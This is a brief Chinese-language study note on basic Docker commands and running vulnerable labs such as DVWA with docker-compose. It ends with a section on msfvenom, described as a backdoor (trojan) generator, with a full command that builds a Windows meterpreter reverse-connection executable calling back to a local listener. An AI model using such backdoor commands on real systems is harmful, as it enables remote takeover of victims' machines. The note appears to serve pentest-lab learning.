docker

docker基础使用

启动docker服务：systemctl start docker

关闭docker服务: systemctl stop docker.socket

systemctl stop docker.service

查看镜像：docker images

查看镜像：docker ps -a

下载镜像：docker pull 镜像名称

镜像网站：https://hub.docker.com/ (境内无法访问)

修改境内镜像源(docker加速器) 阿里云

运行镜像：docker run -dit –name=dvwa -p 10000:80 镜像名称

关闭镜像：docker stop id前三个字母

开启镜像：docker start id前三个字母

删除镜像：docker rm -f id前三个字母

docker进阶使用

docker-compose自动化管理容器

在漏洞文件夹下命令 docker-compose up -d

msfvenom生成木马

msfvenom是用来生成后门的软件，在目标机上执行后门，在本地监听上线

windows可执行程序后门：msfvenom -p windows/x64/meterpreter_tcp lhost=192.168.234.137 lport=9999 -f exe -o test.exe
